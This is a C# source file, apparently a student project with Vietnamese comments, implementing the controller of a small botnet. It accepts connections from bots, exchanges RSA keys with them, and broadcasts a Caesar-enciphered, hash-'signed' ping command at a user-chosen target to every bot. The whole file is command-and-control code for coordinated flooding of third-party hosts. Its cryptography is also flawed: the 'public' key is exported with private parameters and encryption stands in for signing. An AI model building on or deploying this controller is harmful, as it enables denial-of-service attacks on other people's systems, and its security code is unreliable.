using SHA3.Net;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace Botnet
{
    internal class Controller
    {
        const int PORT_NO = 5000;
        const string SERVER_IP = "127.0.0.1";
        static List<TcpClient> clientList = null;
        //static Dictionary<TcpClient, string> hostAndKey = null;
        static List<string> listKey;
        private static string privateKey = ""; //bien chua private key cua RSA
        private static string publicKey = ""; //bien chua public key cua RSA
        private static byte[] keyByte; //bien chua mang byte sau khi convert cua key duoc gui tu server
        private static string decipherKey = ""; //key sau khi duoc giai ma
        private static string cipherCmd = ""; //lenh sau khi duoc ma hoa
        //Phan ma hoa viet ra ham rieng de su dung ve sau, neu co
        public static char cipher(char ch, int key)
        {
            if (!char.IsLetter(ch))
            {

                return ch;
            }

            char d = char.IsUpper(ch) ? 'A' : 'a'; //xu ly voi ky tu hoa thuong
            return (char)((((ch + key) - d) % 26) + d); // tru de chuyen sang thu tu cua chu, cong de chuyen ve dung ky tu ban dau
        }
        //Ham ma hoa
        public static string Encipher(string input, int key)
        {
            string output = string.Empty;

            foreach (char ch in input)
                output += cipher(ch, key);

            return cipherCmd = output;
        }

        //Tao ra 2 key cua RSA
        private static void GenerateRSAKeyPair()
        {
            using (var rsa = new RSACryptoServiceProvider()) //su dung lop RSACryptoServiceProvider()
            {
                try
                {
                    publicKey = rsa.ToXmlString(true); //chuyen thanh dinh dang xml de gui di, mac dinh cua rsa tu document
                    privateKey = rsa.ToXmlString(true); //chuyen thanh dinh dang xml de gui di, mac dinh cua rsa tu document
                }
                catch (CryptographicException ex)
                {

                }
                finally
                {
                    rsa.PersistKeyInCsp = true; //giu cho ca 2 key khong bi thay doi trong suot qua trinh
                }
            }
        }
        private static void DecryptKey(string key)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                try
                {
                    rsa.FromXmlString(privateKey); //lay private key duoc generate ra

                    keyByte = rsa.Decrypt(Convert.FromBase64String(key), false); //giai ma voi private key, false de su dung PKCS#1 padding 
                    decipherKey = Encoding.ASCII.GetString(keyByte);
                }
                catch (Exception e)
                {

                }
            }
        }

        private static string EncryptHash(string hash)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                try
                {
                    rsa.FromXmlString(privateKey);
                    return Convert.ToBase64String(rsa.Encrypt(Encoding.UTF8.GetBytes(hash),false));
                }
                catch (Exception)
                {
                    
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
            return "";
        }

        private static string GenerateSHA3(string command)
        {
            using (var shaAlg = Sha3.Sha3256())
            {
                var hash = shaAlg.ComputeHash(Encoding.UTF8.GetBytes(command));
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }
        private static string CreateSignature(string command)
        {
            string hash = GenerateSHA3(command);
            return EncryptHash(hash);
        }
        public static void Main(string[] args)
        {
            GenerateRSAKeyPair();
            clientList = new List<TcpClient>(); //danh sach cac bot ket noi voi controller
            listKey = new List<string>();
            var rsa = new RSACryptoServiceProvider(1024);
            IPAddress localAdd = IPAddress.Parse(SERVER_IP);
            TcpListener listener = new TcpListener(localAdd, PORT_NO);

            //logo
            Console.WriteLine("        .....         ...   ................       ....          .:^^^^:.           ....            \r\n       .7????7:      ~???: .???????????????!    .^!???7.       ^!?????J??!.      :~7???!            \r\n       :???????^     ~???: .^~~~^!???7~^~~~:  ^7??????7.      ~???!:.:~???7.   ^7??????7.           \r\n       :???!!???~    ~???:       :???!        ~!^.:???7.     :???7     ~???~  .!!^.^???7.           \r\n       :???~ !???~   ~???:       ^???7.           :???7.     ~???~     :???7       ^???7.           \r\n       :???~  ~???!. ~???:       ^???7.           :???7.     !???~     :???7.      ^???7.           \r\n       :???~   ~???7.~???:       ^???7.           :???7.     !???~     :???7       ^???7.           \r\n       :???~    ^???7!???:       ^???7.           :???7.     ~???!     ^???~       ^???7            \r\n       :???~     :7??????:       ^???7.        ...^???7:...  .7???^   :7???:   ....^???7....        \r\n       :?JJ~      .7?????:       ^??J7.       !???????????7   :7???777?J?7:    !???????????7        \r\n       .^~~:       .^~~~^        .^~~:        :~~~~~~~~~~~^    .^~!777!~:      ^~~~~~~~~~~~^        ");
            Console.WriteLine();
            Console.WriteLine("\t\t\t\t @ \t Code by PK115 and NDNA \t @");
            Console.WriteLine();
            listener.Start();

            //thread nay dung de luon luon lang nghe ket noi
            Thread listen = new Thread(() =>
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    clientList.Add(client);
                    NetworkStream nwStream = client.GetStream();
                    Console.WriteLine("Host " + client.Client.RemoteEndPoint + " connected");

                    //Phan gui di public key
                    nwStream.Write(Encoding.ASCII.GetBytes(publicKey), 0, publicKey.Length);

                    //Doc key duoc ma hoa tu client
                    byte[] fullKey = new byte[8192];
                    int fullKeyLen = nwStream.Read(fullKey, 0, 8192);
                    string fullKeyS = Encoding.ASCII.GetString(fullKey, 0, fullKeyLen);
                    listKey.Add(fullKeyS); //dua key duoc ma hoa vao mang

                    //tao mot luong luon luon lang nghe msg cac bot ket noi voi controller
                    Thread receive = new Thread(() =>
                    {
                        while (true)
                        {
                            // dat phan nhan message o day de` phong` can phai lay du lieu gi do tu bot
                            byte[] buffer = new byte[8192];
                            int bytesRead = nwStream.Read(buffer, 0, 8192); 
                            Console.WriteLine(Encoding.ASCII.GetString(buffer, 0, bytesRead));
                        }
                    });
                    receive.IsBackground = true; //dat luong nay chay trong nen`
                    receive.Start();
                }
            });
            listen.IsBackground = true; //dat luong nay chay trong nen`
            listen.Start();
            int choice = 0;
            
            //Menu
            while (true)
            {
                Console.WriteLine("Option: ");
                Console.WriteLine("\t [1] \t Start ping to Server \t");
                Console.WriteLine();
                Console.Write("Start ?: ");
                choice = Int32.Parse(Console.ReadLine());
                switch (choice)
                {
                    case 1:
                        {
                            int count = 0;
                            Console.Write("Enter Target: ");
                            string host = Console.ReadLine();
                            string ping = "ping " + host; //tao ra lenh ping den host
                            string command = ping + "!!!" + CreateSignature(ping);
                            foreach(TcpClient client in clientList) //lap qua tat ca cac con bot
                            {
                                DecryptKey(listKey[count]); //giai ma key nhan duoc bot
                                Encipher(command, Int32.Parse(decipherKey)); //ma hoa lenh gui sang bot

                                //lay network stream cua tung bot
                                NetworkStream nw = client.GetStream();
                                nw.Write(Encoding.ASCII.GetBytes(cipherCmd), 0, cipherCmd.Length);
                                count++;
                            }
                            break;
                        }
                }
            }
        }
    }
}
